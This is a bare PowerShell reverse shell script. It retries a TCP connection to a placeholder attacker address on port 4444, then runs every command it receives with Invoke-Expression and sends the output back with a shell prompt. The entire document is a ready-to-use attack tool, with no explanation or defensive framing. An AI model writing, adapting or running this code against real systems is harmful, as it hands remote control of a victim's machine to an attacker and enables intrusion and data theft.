$remoteIP = "x.x.x.x"
$remotePort = "4444"

do {
    Start-Sleep -Seconds 1
    try{
        $TCPClient = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)
    }catch{}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$streamWriter = New-Object System.IO.StreamWriter($NetworkStream)
function writeStreamToServer($string){
    [byte[]]$script:buffer = 0..$TCPClient.ReceiveBufferSize | % {0}
    $streamWriter.Write($string + 'SHELL '+(Get-Location).Path+' :> ')
    $streamWriter.Flush()
}

writeStreamToServer ''

while (($bytesRead = $NetworkStream.Read($script:buffer, 0, $script:buffer.Length)) -gt 0) {
    $command = [System.Text.Encoding]::UTF8.GetString($script:buffer, 0, $bytesRead - 1)

    $output = try {
        Invoke-Expression $command 2>&1 | Out-String
    }
    catch {
        $_ | Out-String
    }

    writeStreamToServer($output)
}

$streamWriter.Close()